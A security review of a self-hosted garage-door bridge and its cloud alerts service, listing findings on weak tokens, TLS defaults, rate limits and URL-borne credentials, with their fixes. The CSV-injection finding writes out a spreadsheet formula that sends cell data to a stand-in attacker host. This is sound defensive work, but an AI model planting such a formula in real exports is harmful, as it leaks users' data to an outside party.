# Security review — bridge and cloud alerts (2026-09-21)

Scope: everything a person who is not Pascal would run or talk to once the GHCR image is public and
`garageopener.app` documents self-hosting (#3, #1). Reviewed at commit `8ea7072` on `development`.

- `bridge/` — Fastify HTTP surface, auth, members/invites, config, Protect client, SQLite store, Docker image.
- `cloud/` — the shared `garage-alerts` Worker, its Durable Objects and the unauthenticated webhook route.
- Out of scope: the iOS app (not distributed as source), Pascal's own NAS/tunnel deployment (infra repo).

The threat model changed with #3. Until now every token, every console and every deployment was Pascal's.
From the moment the image is public the bridge is **a door opener run by strangers, often reachable from the
internet through a tunnel, holding a Protect API key that is a full-console credential**. The findings below
are graded against that model, not against a single-owner LAN box.

## Summary

| # | Severity | Component | Finding | Status |
|---|---|---|---|---|
| B-1 | Medium | bridge | `BRIDGE_TOKENS` accepted 8-character admin tokens | Fixed |
| B-2 | Medium | bridge | `PROTECT_TLS=insecure` (the default) allowed for routable hosts | Fixed |
| B-3 | Medium | bridge | `/v1/events` streams were uncapped | Fixed |
| B-4 | Low–Med | bridge | CSV formula injection in the activity export | Fixed |
| B-5 | Low | bridge | `/healthz` had no rate limit at all | Fixed |
| B-6 | Medium | bridge | Per-IP limits collapse behind a reverse proxy or tunnel | Fixed |
| B-11 | Medium | bridge | Failed authentication was not throttled at all | Fixed |
| C-1 | Medium | cloud | APNs device registrations per install were unbounded | Fixed |
| C-2 | Medium | cloud | `/w/:routingToken` had no per-IP limit | Fixed |
| B-7 | Low | bridge | SSE bearer token travels in the query string | Accepted, documented |
| B-8 | Low | bridge | `WEBHOOK_SECRET` travels in the URL path | Accepted, documented |
| C-3 | Low | cloud | Install existence oracle in `verifySecret` | Accepted |
| C-5 | Low | cloud | Webhook routing token travels in the URL path | Accepted, forced |
| B-9 / B-10 / C-4 | Info | both | Unauthenticated `/healthz`, unsalted token hashes, in-memory DO window | Accepted, explained |

Nothing found was remotely exploitable without a credential. The fixed items are all either *weak defaults a
self-hoster would inherit* or *resource exhaustion by an authenticated or unauthenticated party*.

## Fixed

### B-1 — admin tokens could be 8 characters (Medium)
`validateMode` enforced `t.length < 8`. `BRIDGE_TOKENS` is the credential that opens the garage door, and the
docs invite people to paste their own value. Eight characters of chosen text is guessable, and — see B-11 —
nothing throttled the guessing.

Minimum raised to 24 characters, with rejection of dictionary values (`changeme`, `garage`, `admin`, …) and
low-entropy strings. `openssl rand -hex 24` is now named in the error message itself. Pascal's live tokens are
48 characters, so the NAS deployment is unaffected. *Mock mode is deliberately exempt* — `demo-` tokens must
keep working for App Review.

### B-2 — `PROTECT_TLS=insecure` was allowed for any host (Medium)
`insecure` disables certificate verification entirely and is the **default**. On a LAN, pointing at a UDM's
self-signed certificate, that is the pragmatic choice and stays the default. Aimed at a routable hostname it
hands the Protect API key — which can read every camera on the console — to anyone on the path.

`insecure` is now refused when `PROTECT_URL`'s host is not a LAN address (RFC1918, loopback, link-local, ULA,
`.local`/`.lan`/`.internal`/`.home.arpa`). The error names `fingerprint:<sha256>` and `system` as the ways
forward. This is a startup failure, not a warning, because a warning in a container log is never read.

### B-3 — `/v1/events` streams were uncapped (Medium)
The route carried `rateLimit: false` and every accepted connection pinned a socket, five bus listeners and a
15-second heartbeat timer until the client hung up. Any valid token — including a family member's, or one
leaked from a revoked phone — could open thousands and exhaust file descriptors and memory on a NAS.

Capped at 8 concurrent streams per token and 64 overall (`SSE_MAX_PER_TOKEN`, `SSE_MAX_TOTAL`); over the cap
answers `429 rate_limited`. Slots are released on `close` *and* `error`, which the previous code did not do
either — a stream torn down by a network error left its listeners attached.

### B-4 — CSV formula injection in the activity export (Low–Medium)
`csvField` was correct RFC-4180 quoting but did nothing about spreadsheet formulas. `/v1/audit.csv` writes
`member` and `source` straight into the file; `member` comes from `deviceName` at invite-claim time (any
1–48 characters) and `source` from `?source=` on a door command. A family member could name their phone
`=HYPERLINK("http://attacker/"&A1,"Open")`, and the owner exporting their activity log in Excel or Numbers
would execute it.

Fields starting with `= + - @`, tab or CR are now prefixed with an apostrophe before quoting.

### B-5 — `/healthz` had no rate limit (Low)
`rateLimit: false` on the one route reachable without a credential from anywhere the bridge is exposed. Now
120/min per IP, which leaves ample headroom for the container `HEALTHCHECK` (every 30s) and uptime monitors.

### B-6 — per-IP limits collapse behind a proxy (Medium, self-hosting)
`trustProxy` was never set, so `req.ip` is the socket peer. The moment a self-hoster puts the bridge behind
Cloudflare Tunnel, Caddy or nginx — which is exactly what the remote-access documentation will recommend —
every request arrives from one address. The two routes keyed by IP are the unauthenticated ones:

- `/v1/invites/:code/claim` at 5/min becomes **5/min for the whole household**, so adding two phones in a row
  fails, and one attacker guessing codes consumes the family's budget.
- The Alarm Manager webhook at 120/min becomes one shared bucket.

Added `TRUST_PROXY` (default off). The documentation says to enable it only when a proxy you control sets
`X-Forwarded-For`, since trusting the header when nothing strips it lets a client forge its own address.

Per-token limits were **not** affected: verified empirically that `@fastify/rate-limit`'s global limit is
applied per-route, after the authentication `onRequest` hook, so `req.token` is populated when the key is
computed. Two tokens from one address get independent 60/min budgets.

### B-11 — failed authentication was not throttled (Medium)
Found while verifying a claim made about B-1. Authentication is settled in a global `onRequest` hook that runs
*before* the per-route rate limiter, so a request that never presents a valid token returns 401 without being
charged to any bucket. Measured: **400 consecutive bad-token requests, 400 × 401, zero 429** — both with a
different token each time and with the same one repeated. An exposed bridge could be probed without limit, and
its operator had no signal that it was happening (request logging sits at `warn` unless `LOG_LEVEL=debug`).

Failures are now counted per source address; past 30 in a rolling minute the answer becomes
`429 rate_limited`, and the bridge logs a warning **once** per window so the operator sees it without the log
being flooded.

The counter is deliberately consulted only *after* authentication has been attempted, so a valid admin or
member token always succeeds even from a throttled address. That matters because a household behind a tunnel
or NAT shares one address: a revoked phone retrying in a loop must never be able to lock the family out. The
honest consequence is that this bounds the *answer*, not the work — an exposed bridge should still have rate
limiting in the tunnel or proxy in front of it, which the self-hosting guide now says.

### C-1 — unbounded APNs device registrations (Medium)
`PUT /v1/installs/:id/devices` appended to a map with no cap. Every alert rule fans out to every registered
token, so an install could be turned into a push amplifier and its DO storage grown without limit. Capped at
12 (`MAX_DEVICES`), evicting oldest first — phones legitimately re-register on token rotation, so rejecting
would have broken real installs.

### C-2 — `/w/:routingToken` had no per-IP limit (Medium)
The per-install limit of 120/min lives in `InstallObject` instance memory, so it resets whenever the DO is
evicted, and it does nothing at all against a spray of *invented* tokens — each one instantiated a Durable
Object before being rejected. Added a 600/min per-IP gate ahead of the DO lookup, using the same
`RateLimitObject` as install creation. A real console posting for one install stays far below it.

## Accepted, with documentation

### B-7 — SSE token in the query string (Low)
`/v1/events?token=…` exists because `EventSource` cannot set an `Authorization` header. Fastify only logs
request URLs at `debug`, but a reverse proxy in front will log the full line including the token. Accepted:
the alternative is a short-lived ticket endpoint, which is a contract and app change out of proportion to the
risk. The self-hosting guide tells people not to log query strings on the bridge's route, and the token is
revocable from the app.

### B-8 — `WEBHOOK_SECRET` in the URL path (Low)
Same class. Alarm Manager only lets you configure a URL, so the secret has to live in it. It is compared in
constant time, a miss returns a bare 404 (no oracle), and the route accepts GET, so the URL can also land in
browser history if someone pastes it. Documented; rotating it means editing one Protect rule.

### C-5 — the webhook routing token is in the URL path (Low)
*Added 2026-09-22, after the original review missed it.*

`/w/<routingToken>` puts the credential in the path, so it is recorded wherever request paths are — most
notably Cloudflare's own edge analytics, which is a wider and longer-lived audience than the Worker's logs
and is readable by anyone holding zone analytics access. Found by the infrastructure side running per-hostname
path analytics for an unrelated reason, not by this review.

**This is the same finding as B-7 and B-8 on the bridge, and the review should have caught it.** Both of those
flag a credential travelling in a URL rather than a header; the Worker's equivalent was not examined, which is
an inconsistency in the review rather than a difference between the components.

What the token permits, and does not: it authorises **posting events** to one install. It cannot read status,
cannot change settings and cannot erase the install — all of those require the install secret, which travels
in an `Authorization` header and never appears in a URL. The realistic abuse is injecting events, and the
worst of those is a forged `closed` for a door that is actually open, which would suppress the very alert the
service exists to send.

**Accepted because it is forced, not because the risk is negligible.** Protect's Alarm Manager offers a single
field — a URL. It cannot send a custom header, so a header-borne token would make the service unusable with
the one integration it exists to serve. This is the identical constraint as B-8's `WEBHOOK_SECRET`.

What genuinely reduces it, in order of value:

- The token is 192 bits of randomness, so the path is not guessable; C-2's per-IP rate limit blunts spraying.
- Rotation already exists in the product, just not by that name: erasing and re-enabling cloud alerts issues a
  new token. It costs the user re-pasting two Alarm Manager rules.
- The paths should be kept out of tickets, documentation and screenshots. That is a handling rule rather than
  a control, and it is now written down.

### C-3 — install existence oracle (Low)
`verifySecret` returns `missing` (→404) for an install that was never created and `unauthorized` (→401) for a
wrong secret, so a caller can distinguish the two. The `installId` is 64 hex characters derived from a
256-bit routing token, so there is nothing to enumerate. Left as-is because the distinction is genuinely
useful when an app's stored install has been erased.

## Checked and found sound

- **No CSRF surface.** Bearer-only, no cookies, no session; a cross-origin form POST to `/v1/door/open`
  arrives without an `Authorization` header and gets 401. DNS-rebinding against a LAN bridge reaches only
  `/healthz`.
- **No shipped credentials.** No default token, password or key anywhere in the image or compose files. Live
  mode refuses to start without `BRIDGE_TOKENS`. The `demo-` prefix grants admin **only** in mock mode, where
  the instance drives an in-memory simulator and there is no console and no door to reach.
- **Token handling.** Admin tokens compared in constant time; member tokens stored as SHA-256 of 256-bit
  random values (unsalted is correct here — there is no low-entropy space to attack); invite codes are 80-bit
  base32, single-use, 15-minute TTL, compared by hash.
- **Container.** Runs as `node`, not root; `/data` owned by `node`; multi-stage build ships no toolchain.
- **Secret isolation.** The Worker never receives a Protect API key. The APNs key is a Worker secret and
  appears in no response. `redact()` masks key/token/secret values in configuration errors, and both sides
  strip thumbnails and long strings before logging a webhook payload.
- **Retention matches the claim.** `EVENT_RETENTION_MS` is 7 days and `EVENT_CAP` 500, which is what the
  privacy page will state; `DELETE /v1/installs/:id` calls `deleteAll()` on the Durable Object.

## Follow-ups not done here

- **Bridge token rotation** has no in-app path: `BRIDGE_TOKENS` is env-only, so rotating an admin token means
  editing the stack and restarting. Member tokens can already be revoked from the Family screen. Worth a
  first-class flow if self-hosting gets traction (tracked in #3's onboarding item).
- **No audit entry on failed authentication.** B-11 added a log line; a `kind: "auth"` audit row would put it
  on the Activity screen where the owner would actually see it. Deferred because a new audit kind changes the
  OpenAPI contract and the generated Swift client.
- **Publishing the bridge's source (#3)** remains the strongest remaining control: it is what lets a
  self-hoster verify any of the above rather than take it on trust. See
  [ADR-0017](adr/0017-bridge-source-goes-public-apache-2.md), which also records why the cloud Worker is
  *not* published: it holds no credential to anyone's console, nobody can self-host it, and it is a service we
  operate rather than a thing users run. This document's cloud findings are published regardless, so that
  people relying on the shared service can see what was looked for.
